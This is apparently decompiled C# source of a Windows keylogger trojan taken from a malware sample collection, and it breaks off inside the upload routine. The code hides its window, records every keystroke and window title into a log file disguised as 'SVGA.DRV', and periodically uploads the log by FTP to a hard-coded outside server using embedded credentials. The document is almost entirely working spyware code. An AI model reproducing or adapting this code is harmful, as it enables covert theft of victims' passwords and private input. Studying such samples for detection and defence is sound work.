// Decompiled with JetBrains decompiler
// Type: services.form1
// Assembly: services, Version=5.1.2600.5512, Culture=neutral, PublicKeyToken=null
// MVID: F6A9F931-6B07-4D28-AD3E-515314EA1568
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan-Spy.MSIL.KeyLogger.cme-57cab9f39b07241f0d75407eafce3d58eabd5382a70cdb5631e61e32bd63ac98.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using services.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace services
{
  [DesignerGenerated]
  internal class form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("tmrGetKeyState")]
    private System.Windows.Forms.Timer _tmrGetKeyState;
    [AccessedThroughProperty("tmrStartDelay")]
    private System.Windows.Forms.Timer _tmrStartDelay;
    [AccessedThroughProperty("txtCurrentLog")]
    private TextBox _txtCurrentLog;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("TextBox3")]
    private TextBox _TextBox3;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer _Timer3;
    [AccessedThroughProperty("Label2")]
    private Label _Label2;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    [AccessedThroughProperty("Timer4")]
    private System.Windows.Forms.Timer _Timer4;
    private Process oProcess;
    private Process p;
    private object oWMIService;
    private string strComputer;
    private string KeyLog;
    private int nSek;
    private string strText;
    private string mystr;
    private string LastCheckedForegroundTitle;
    private const int WM_NCLBUTTONDOWN = 161;
    private const short HTCAPTION = 2;
    private const short SW_SHOWNORMAL = 1;
    private const int VK_CAPITAL = 20;
    private const int FORMAT_MESSAGE_FROM_SYSTEM = 4096;
    private int m_lngLogLenByte;
    private string m_strStartTime;
    private string m_strLogFile;
    [SpecialName]
    private bool \u0024STATIC\u0024CapsLockOn\u00242002\u0024blnInit;
    [SpecialName]
    private bool \u0024STATIC\u0024CapsLockOn\u00242002\u0024blnOn;

    [DebuggerNonUserCode]
    static form1()
    {
    }

    public form1()
    {
      this.FormClosing += new FormClosingEventHandler(this.form1_FormClosing);
      this.Load += new EventHandler(this.Form1_Load);
      lock (form1.__ENCList)
        form1.__ENCList.Add(new WeakReference((object) this));
      this.p = new Process();
      this.LastCheckedForegroundTitle = "";
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (form1));
      this.tmrGetKeyState = new System.Windows.Forms.Timer(this.components);
      this.tmrStartDelay = new System.Windows.Forms.Timer(this.components);
      this.txtCurrentLog = new TextBox();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.TextBox1 = new TextBox();
      this.TextBox3 = new TextBox();
      this.Timer3 = new System.Windows.Forms.Timer(this.components);
      this.Label2 = new Label();
      this.Timer4 = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      this.tmrGetKeyState.Interval = 1;
      TextBox txtCurrentLog1 = this.txtCurrentLog;
      Point point1 = new Point(12, 12);
      Point point2 = point1;
      txtCurrentLog1.Location = point2;
      this.txtCurrentLog.MaxLength = 3277;
      this.txtCurrentLog.Multiline = true;
      this.txtCurrentLog.Name = "txtCurrentLog";
      this.txtCurrentLog.ScrollBars = ScrollBars.Vertical;
      TextBox txtCurrentLog2 = this.txtCurrentLog;
      Size size1 = new Size(226, 166);
      Size size2 = size1;
      txtCurrentLog2.Size = size2;
      this.txtCurrentLog.TabIndex = 0;
      this.Timer1.Enabled = true;
      this.Timer1.Interval = 30000;
      this.Timer2.Enabled = true;
      this.Timer2.Interval = 1000;
      TextBox textBox1_1 = this.TextBox1;
      point1 = new Point(15, 206);
      Point point3 = point1;
      textBox1_1.Location = point3;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_2 = this.TextBox1;
      size1 = new Size(100, 20);
      Size size3 = size1;
      textBox1_2.Size = size3;
      this.TextBox1.TabIndex = 1;
      TextBox textBox3_1 = this.TextBox3;
      point1 = new Point(15, 232);
      Point point4 = point1;
      textBox3_1.Location = point4;
      this.TextBox3.Name = "TextBox3";
      TextBox textBox3_2 = this.TextBox3;
      size1 = new Size(100, 20);
      Size size4 = size1;
      textBox3_2.Size = size4;
      this.TextBox3.TabIndex = 2;
      this.Label2.AutoSize = true;
      Label label2_1 = this.Label2;
      point1 = new Point(12, 190);
      Point point5 = point1;
      label2_1.Location = point5;
      this.Label2.Name = "Label2";
      Label label2_2 = this.Label2;
      size1 = new Size(39, 13);
      Size size5 = size1;
      label2_2.Size = size5;
      this.Label2.TabIndex = 3;
      this.Label2.Text = "Label1";
      this.Timer4.Enabled = true;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(246, 269);
      this.ClientSize = size1;
      this.ControlBox = false;
      this.Controls.Add((Control) this.Label2);
      this.Controls.Add((Control) this.TextBox3);
      this.Controls.Add((Control) this.TextBox1);
      this.Controls.Add((Control) this.txtCurrentLog);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = "Services";
      this.WindowState = FormWindowState.Minimized;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    public virtual System.Windows.Forms.Timer tmrGetKeyState
    {
      [DebuggerNonUserCode] get => this._tmrGetKeyState;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.tmrGetKeyState_Tick);
        if (this._tmrGetKeyState != null)
          this._tmrGetKeyState.Tick -= eventHandler;
        this._tmrGetKeyState = value;
        if (this._tmrGetKeyState == null)
          return;
        this._tmrGetKeyState.Tick += eventHandler;
      }
    }

    public virtual System.Windows.Forms.Timer tmrStartDelay
    {
      [DebuggerNonUserCode] get => this._tmrStartDelay;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.tmrStartDelay_Tick);
        if (this._tmrStartDelay != null)
          this._tmrStartDelay.Tick -= eventHandler;
        this._tmrStartDelay = value;
        if (this._tmrStartDelay == null)
          return;
        this._tmrStartDelay.Tick += eventHandler;
      }
    }

    public virtual TextBox txtCurrentLog
    {
      [DebuggerNonUserCode] get => this._txtCurrentLog;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler1 = new EventHandler(this.txtCurrentLog_TextChanged);
        EventHandler eventHandler2 = new EventHandler(this.txtCurrentLog_TextChanged);
        if (this._txtCurrentLog != null)
        {
          this._txtCurrentLog.TextChanged -= eventHandler1;
          this._txtCurrentLog.TextChanged -= eventHandler2;
        }
        this._txtCurrentLog = value;
        if (this._txtCurrentLog == null)
          return;
        this._txtCurrentLog.TextChanged += eventHandler1;
        this._txtCurrentLog.TextChanged += eventHandler2;
      }
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual TextBox TextBox3
    {
      [DebuggerNonUserCode] get => this._TextBox3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox3 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      [DebuggerNonUserCode] get => this._Timer3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer3_Tick);
        if (this._Timer3 != null)
          this._Timer3.Tick -= eventHandler;
        this._Timer3 = value;
        if (this._Timer3 == null)
          return;
        this._Timer3.Tick += eventHandler;
      }
    }

    internal virtual Label Label2
    {
      [DebuggerNonUserCode] get => this._Label2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label2 = value;
    }

    public virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    public virtual System.Windows.Forms.Timer Timer2
    {
      [DebuggerNonUserCode] get => this._Timer2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
        if (this._Timer2 != null)
          this._Timer2.Tick -= eventHandler;
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += eventHandler;
      }
    }

    public virtual System.Windows.Forms.Timer Timer4
    {
      [DebuggerNonUserCode] get => this._Timer4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Timer4 = value;
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    private string GetActiveWindowTitle()
    {
      string lpString = new string(char.MinValue, 100);
      form1.GetWindowText(form1.GetForegroundWindow(), ref lpString, 100);
      return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
    }

    private string UserName()
    {
      string name = MyProject.User.Name;
      return name.Substring(checked (name.IndexOf("\\") + 1));
    }

    private void form1_FormClosing(object sender, FormClosingEventArgs e) => MyProject.Computer.FileSystem.WriteAllText(FileSystem.CurDir() + "\\SVGA.DRV", this.txtCurrentLog.Text, true);

    private void Form1_Load(object sender, EventArgs e)
    {
      this.TextBox3.Text = this.UserName() + ".log";
      this.Timer1.Start();
      this.Timer2.Interval = 1000;
      this.Timer3.Enabled = true;
      this.nSek = 600;
      this.tmrGetKeyState.Enabled = true;
      if (Strings.InStr(1, Interaction.Command(), "autolog") != 0)
        return;
      this.oProcess = this.p;
      string path1 = "C:\\windows\\system";
      string path2 = "D:\\windows\\system";
      string path3 = "E:\\windows\\system";
      string path4 = "F:\\windows\\system";
      if (Directory.Exists(path1))
        this.TextBox1.Text = "C:\\windows\\system32\\Iogonui.exe";
      else if (Directory.Exists(path2))
        this.TextBox1.Text = "D:\\windows\\system32\\Iogonui.exe";
      else if (Directory.Exists(path3))
        this.TextBox1.Text = "E:\\windows\\system32\\Iogonui.exe";
      else if (Directory.Exists(path4))
        this.TextBox1.Text = "F:\\windows\\system32\\Iogonui.exe";
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern short GetKeyState(int nVirtKey);

    private bool CapsLockOn()
    {
      if (!this.\u0024STATIC\u0024CapsLockOn\u00242002\u0024blnInit)
      {
        do
          ;
        while (form1.GetAsyncKeyState(20) != (short) 0);
        this.\u0024STATIC\u0024CapsLockOn\u00242002\u0024blnOn = form1.GetKeyState(20) != (short) 0;
        this.\u0024STATIC\u0024CapsLockOn\u00242002\u0024blnInit = true;
      }
      else if (form1.GetAsyncKeyState(20) != (short) 0)
      {
        while (form1.GetAsyncKeyState(20) != (short) 0)
          Application.DoEvents();
        this.\u0024STATIC\u0024CapsLockOn\u00242002\u0024blnOn = !this.\u0024STATIC\u0024CapsLockOn\u00242002\u0024blnOn;
      }
      return this.\u0024STATIC\u0024CapsLockOn\u00242002\u0024blnOn;
    }

    private void StartLogging()
    {
      this.m_strStartTime = DateAndTime.TimeString;
      this.m_strLogFile = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) MyProject.Application.Info.DirectoryPath, Interaction.IIf(Operators.CompareString(Strings.Right(MyProject.Application.Info.DirectoryPath, 1), "\\", false) != 0, (object) "\\", (object) "")), (object) "SVGA.drv"));
      this.tmrGetKeyState.Enabled = true;
      this.tmrStartDelay.Enabled = true;
    }

    private void txtCurrentLog_TextChanged(object eventSender, EventArgs eventArgs)
    {
      this.m_strLogFile = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) MyProject.Application.Info.DirectoryPath, Interaction.IIf(Operators.CompareString(Strings.Right(MyProject.Application.Info.DirectoryPath, 1), "\\", false) != 0, (object) "\\", (object) "")), (object) "SVGA.drv"));
      if (this.tmrStartDelay.Enabled)
      {
        this.txtCurrentLog.Text = "";
      }
      else
      {
        string text = this.txtCurrentLog.Text;
        FileSystem.FileOpen(1, this.m_strLogFile, OpenMode.Binary);
        FileSystem.FilePut(1, "NewLog: \r\nDatum: " + DateAndTime.DateString + "\r\nStart: " + DateAndTime.TimeString + "\r\n" + new string('-', 50) + "\r\n", -1L, false);
        FileSystem.FileClose(1);
      }
    }

    private void tmrGetKeyState_Tick(object eventSender, EventArgs eventArgs)
    {
      int asyncKeyState1 = (int) form1.GetAsyncKeyState(16);
      short num = 65;
      do
      {
        int asyncKeyState2 = (int) form1.GetAsyncKeyState((int) num);
        if (this.CapsLockOn() & asyncKeyState1 == 0 & (asyncKeyState2 & 1) == 1 | !this.CapsLockOn() & asyncKeyState1 != 0 & (asyncKeyState2 & 1) == 1)
        {
          string strText = Conversions.ToString(Strings.UCase(Strings.Chr((int) num)));
          this.AddText(ref strText);
        }
        if (!this.CapsLockOn() & asyncKeyState1 == 0 & (asyncKeyState2 & 1) == 1 | this.CapsLockOn() & asyncKeyState1 != 0 & (asyncKeyState2 & 1) == 1)
        {
          string strText = Conversions.ToString(Strings.LCase(Strings.Chr((int) num)));
          this.AddText(ref strText);
        }
        checked { ++num; }
      }
      while (num <= (short) 90);
      int asyncKeyState3 = (int) form1.GetAsyncKeyState(49);
      string strText1;
      if (asyncKeyState1 == 0 & (asyncKeyState3 & 1) == 1)
      {
        strText1 = "1";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState3 & 1) == 1)
      {
        strText1 = "!";
        this.AddText(ref strText1);
      }
      int asyncKeyState4 = (int) form1.GetAsyncKeyState(50);
      if (asyncKeyState1 == 0 & (asyncKeyState4 & 1) == 1)
      {
        strText1 = "2";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState4 & 1) == 1)
      {
        strText1 = "@";
        this.AddText(ref strText1);
      }
      int asyncKeyState5 = (int) form1.GetAsyncKeyState(51);
      if (asyncKeyState1 == 0 & (asyncKeyState5 & 1) == 1)
      {
        strText1 = "3";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState5 & 1) == 1)
      {
        strText1 = "#";
        this.AddText(ref strText1);
      }
      int asyncKeyState6 = (int) form1.GetAsyncKeyState(52);
      if (asyncKeyState1 == 0 & (asyncKeyState6 & 1) == 1)
      {
        strText1 = "4";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState6 & 1) == 1)
      {
        strText1 = "$";
        this.AddText(ref strText1);
      }
      int asyncKeyState7 = (int) form1.GetAsyncKeyState(53);
      if (asyncKeyState1 == 0 & (asyncKeyState7 & 1) == 1)
      {
        strText1 = "5";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState7 & 1) == 1)
      {
        strText1 = "%";
        this.AddText(ref strText1);
      }
      int asyncKeyState8 = (int) form1.GetAsyncKeyState(54);
      if (asyncKeyState1 == 0 & (asyncKeyState8 & 1) == 1)
      {
        strText1 = "6";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState8 & 1) == 1)
      {
        strText1 = "^";
        this.AddText(ref strText1);
      }
      int asyncKeyState9 = (int) form1.GetAsyncKeyState(55);
      if (asyncKeyState1 == 0 & (asyncKeyState9 & 1) == 1)
      {
        strText1 = "7";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState9 & 1) == 1)
      {
        strText1 = "&";
        this.AddText(ref strText1);
      }
      int asyncKeyState10 = (int) form1.GetAsyncKeyState(56);
      if (asyncKeyState1 == 0 & (asyncKeyState10 & 1) == 1)
      {
        strText1 = "8";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState10 & 1) == 1)
      {
        strText1 = "*";
        this.AddText(ref strText1);
      }
      int asyncKeyState11 = (int) form1.GetAsyncKeyState(57);
      if (asyncKeyState1 == 0 & (asyncKeyState11 & 1) == 1)
      {
        strText1 = "9";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState11 & 1) == 1)
      {
        strText1 = "(";
        this.AddText(ref strText1);
      }
      int asyncKeyState12 = (int) form1.GetAsyncKeyState(48);
      if (asyncKeyState1 == 0 & (asyncKeyState12 & 1) == 1)
      {
        strText1 = "0";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState12 & 1) == 1)
      {
        strText1 = ")";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(8) & 1) == 1)
      {
        strText1 = "{BackSpace}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(9) & 1) == 1)
      {
        strText1 = "{Tab}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(13) & 1) == 1)
      {
        strText1 = "\r\n";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(16) & 1) == 1)
      {
        strText1 = "{Shift}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(17) & 1) == 1)
      {
        if (((int) form1.GetAsyncKeyState(18) & 1) == 1)
        {
          strText1 = "{AltGr}";
          this.AddText(ref strText1);
        }
        else
        {
          strText1 = "{Ctrl}";
          this.AddText(ref strText1);
        }
      }
      if (((int) form1.GetAsyncKeyState(18) & 1) == 1)
      {
        strText1 = "{Alt}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(19) & 1) == 1)
      {
        strText1 = "{Pause}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(27) & 1) == 1)
      {
        strText1 = "{Esc}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(32) & 1) == 1)
      {
        strText1 = " ";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(35) & 1) == 1)
      {
        strText1 = "{End}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(36) & 1) == 1)
      {
        strText1 = "{Home}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(37) & 1) == 1)
      {
        strText1 = "{Left}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(39) & 1) == 1)
      {
        strText1 = "{Right}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(38) & 1) == 1)
      {
        strText1 = "{Up}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(40) & 1) == 1)
      {
        strText1 = "{Down}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(45) & 1) == 1)
      {
        strText1 = "{Insert}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(46) & 1) == 1)
      {
        strText1 = "{Delete}";
        this.AddText(ref strText1);
      }
      int asyncKeyState13 = (int) form1.GetAsyncKeyState(186);
      if (asyncKeyState1 == 0 & (asyncKeyState13 & 1) == 1)
      {
        strText1 = ";";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState13 & 1) == 1)
      {
        strText1 = ":";
        this.AddText(ref strText1);
      }
      int asyncKeyState14 = (int) form1.GetAsyncKeyState(187);
      if (asyncKeyState1 == 0 & (asyncKeyState14 & 1) == 1)
      {
        strText1 = "=";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState14 & 1) == 1)
      {
        strText1 = "+";
        this.AddText(ref strText1);
      }
      int asyncKeyState15 = (int) form1.GetAsyncKeyState(188);
      if (asyncKeyState1 == 0 & (asyncKeyState15 & 1) == 1)
      {
        strText1 = ",";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState15 & 1) == 1)
      {
        strText1 = "<";
        this.AddText(ref strText1);
      }
      int asyncKeyState16 = (int) form1.GetAsyncKeyState(189);
      if (asyncKeyState1 == 0 & (asyncKeyState16 & 1) == 1)
      {
        strText1 = "-";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState16 & 1) == 1)
      {
        strText1 = "_";
        this.AddText(ref strText1);
      }
      int asyncKeyState17 = (int) form1.GetAsyncKeyState(190);
      if (asyncKeyState1 == 0 & (asyncKeyState17 & 1) == 1)
      {
        strText1 = ".";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState17 & 1) == 1)
      {
        strText1 = ">";
        this.AddText(ref strText1);
      }
      int asyncKeyState18 = (int) form1.GetAsyncKeyState(191);
      if (asyncKeyState1 == 0 & (asyncKeyState18 & 1) == 1)
      {
        strText1 = "/";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState18 & 1) == 1)
      {
        strText1 = "?";
        this.AddText(ref strText1);
      }
      int asyncKeyState19 = (int) form1.GetAsyncKeyState(192);
      if (asyncKeyState1 == 0 & (asyncKeyState19 & 1) == 1)
      {
        strText1 = "`";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState19 & 1) == 1)
      {
        strText1 = "~";
        this.AddText(ref strText1);
      }
      int asyncKeyState20 = (int) form1.GetAsyncKeyState(219);
      if (asyncKeyState1 == 0 & (asyncKeyState20 & 1) == 1)
      {
        strText1 = "[";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState20 & 1) == 1)
      {
        strText1 = "{";
        this.AddText(ref strText1);
      }
      int asyncKeyState21 = (int) form1.GetAsyncKeyState(220);
      if (asyncKeyState1 == 0 & (asyncKeyState21 & 1) == 1)
      {
        strText1 = "\\";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState21 & 1) == 1)
      {
        strText1 = "|";
        this.AddText(ref strText1);
      }
      int asyncKeyState22 = (int) form1.GetAsyncKeyState(221);
      if (asyncKeyState1 == 0 & (asyncKeyState22 & 1) == 1)
      {
        strText1 = "]";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState22 & 1) == 1)
      {
        strText1 = "}";
        this.AddText(ref strText1);
      }
      int asyncKeyState23 = (int) form1.GetAsyncKeyState(222);
      if (asyncKeyState1 == 0 & (asyncKeyState23 & 1) == 1)
      {
        strText1 = "'";
        this.AddText(ref strText1);
      }
      if (asyncKeyState1 != 0 & (asyncKeyState23 & 1) == 1)
      {
        strText1 = "\"";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(106) & 1) == 1)
      {
        strText1 = "*";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(111) & 1) == 1)
      {
        strText1 = "/";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(107) & 1) == 1)
      {
        strText1 = "+";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(109) & 1) == 1)
      {
        strText1 = "-";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(110) & 1) == 1)
      {
        strText1 = "{Del}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(112) & 1) == 1)
      {
        strText1 = "{F1}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(113) & 1) == 1)
      {
        strText1 = "{F2}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(114) & 1) == 1)
      {
        strText1 = "{F3}";
        this.AddText(ref strText1);
      }
      int asyncKeyState24 = (int) form1.GetAsyncKeyState(115);
      if (asyncKeyState1 == 0 & (asyncKeyState24 & 1) == 1)
      {
        strText1 = "{F4}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(116) & 1) == 1)
      {
        strText1 = "{F5}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(117) & 1) == 1)
      {
        strText1 = "{F6}";
        this.AddText(ref strText1);
      }
      int asyncKeyState25 = (int) form1.GetAsyncKeyState(118);
      if (asyncKeyState1 == 0 & (asyncKeyState25 & 1) == 1)
      {
        strText1 = "{F7}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(119) & 1) == 1)
      {
        strText1 = "{F8}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(120) & 1) == 1)
      {
        strText1 = "{F9}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(121) & 1) == 1)
      {
        strText1 = "{F10}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(122) & 1) == 1)
      {
        strText1 = "{F11}";
        this.AddText(ref strText1);
      }
      int asyncKeyState26 = (int) form1.GetAsyncKeyState(123);
      if (asyncKeyState1 == 0 & (asyncKeyState26 & 1) == 1)
      {
        strText1 = "{F12}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(144) & 1) == 1)
      {
        strText1 = "{NumLock}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(145) & 1) == 1)
      {
        strText1 = "{ScrollLock}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(44) & 1) == 1)
      {
        strText1 = "{PrintScreen}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(33) & 1) == 1)
      {
        strText1 = "{PageUp}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(34) & 1) == 1)
      {
        strText1 = "{PageDown}";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(97) & 1) == 1)
      {
        strText1 = "1";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(98) & 1) == 1)
      {
        strText1 = "2";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(99) & 1) == 1)
      {
        strText1 = "3";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(100) & 1) == 1)
      {
        strText1 = "4";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(101) & 1) == 1)
      {
        strText1 = "5";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(102) & 1) == 1)
      {
        strText1 = "6";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(103) & 1) == 1)
      {
        strText1 = "7";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(104) & 1) == 1)
      {
        strText1 = "8";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(105) & 1) == 1)
      {
        strText1 = "9";
        this.AddText(ref strText1);
      }
      if (((int) form1.GetAsyncKeyState(96) & 1) != 1)
        return;
      strText1 = "0";
      this.AddText(ref strText1);
    }

    private void AddText(ref string strText)
    {
      this.txtCurrentLog.SelectionStart = Strings.Len(this.txtCurrentLog.Text);
      this.txtCurrentLog.SelectedText = this.mystr + strText;
    }

    private void tmrStartDelay_Tick(object eventSender, EventArgs eventArgs)
    {
      this.txtCurrentLog.Text = "";
      this.tmrStartDelay.Enabled = false;
    }

    public void StartProgramm(ref string Path) => Interaction.Shell(Path, AppWinStyle.Hide);

    private void Timer1_Tick(object sender, EventArgs e)
    {
      try
      {
        MyProject.Computer.FileSystem.WriteAllText(FileSystem.CurDir() + "\\SVGA.DRV", this.txtCurrentLog.Text + "\r\n", true);
        this.strText = "";
        this.txtCurrentLog.Text = "";
        this.Timer1.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.Timer1.Start();
        if (!this.Timer2.Enabled)
          this.Timer2.Enabled = true;
        ProjectData.ClearProjectError();
      }
    }

    private void Timer2_Tick(object sender, EventArgs e)
    {
      checked { --this.nSek; }
      this.Label2.Text = Conversions.ToString(this.nSek);
      if (this.nSek >= 1)
        return;
      this.Timer2.Enabled = false;
      MyProject.Computer.FileSystem.WriteAllText(FileSystem.CurDir() + "\\SVGA.DRV", this.txtCurrentLog.Text + "\r\n", true);
      this.txtCurrentLog.Text = "";
      this.nSek = 1800;
      FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create("ftp://ftp.sxepo1912.sx.funpic.de/" + this.TextBox3.Text);
      ftpWebRequest.Credentials = (ICredentials) new NetworkCredential("sxepo1912", "nelson19");
      ftpWebRequest.Method = "STOR";
      byte[] buffer = System.IO.File.ReadAllBytes(FileSystem.CurDir() + "\\SVGA.DRV");
      Stream requestStream = ftpWebRequest.GetRequestStream();
